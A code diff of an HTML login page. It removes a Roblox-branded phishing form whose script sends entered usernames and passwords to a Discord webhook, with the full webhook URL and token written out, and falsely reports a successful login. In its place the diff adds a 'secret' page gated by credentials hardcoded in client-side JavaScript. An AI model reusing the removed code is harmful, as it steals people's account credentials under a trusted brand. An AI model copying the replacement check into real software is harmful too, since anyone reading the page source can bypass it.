@@ -81,8 +81,7 @@
 </head>
 <body>
     <div class="login-form">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Roblox_Logo_2017.png" alt="Roblox Logo" class="roblox-logo">
-        <h2>Login to Roblox</h2>
+        <h2>Login to the Secret</h2>
         <form id="loginForm">
             <input type="text" id="username" name="username" placeholder="Username" required><br>
             <input type="password" id="password" name="password" placeholder="Password" required><br>
@@ -93,34 +92,22 @@
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();  // Prevent form submission
+            e.preventDefault();  // Prevent default form submission
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const statusMessage = document.getElementById('statusMessage');
 
-            // Sending data to the Discord webhook
-            fetch('https://discord.com/api/webhooks/1348388971788370054/50M-yjsw_StwaifiA3W3mFLSmV2dpDPEiYICgMhK-7FDkteIXwZ4qsaEZBjO_3Z4CaoE', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: `Login Attempt: \nUsername: ${username} \nPassword: ${password}`
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                // Show success message if request is successful
-                document.getElementById('statusMessage').textContent = 'Logged in successfully!';
-                document.getElementById('statusMessage').classList.add('success');
-                console.log('Success:', data);
-            })
-            .catch(error => {
-                // Show error message
-                document.getElementById('statusMessage').textContent = 'Error: Unable to login';
-                document.getElementById('statusMessage').classList.add('error');
-                console.error('Error:', error);
-            });
+            if (username === "secret" && password === "terces") {
+                statusMessage.textContent = "Login successful!";
+                statusMessage.classList.add('success');
+                setTimeout(() => {
+                    window.location.href = "secret.html"; // Redirect to the hidden page
+                }, 1500); // Delay for effect
+            } else {
+                statusMessage.textContent = "Incorrect username or password!";
+                statusMessage.classList.add('error');
+            }
         });
     </script>
 </body>
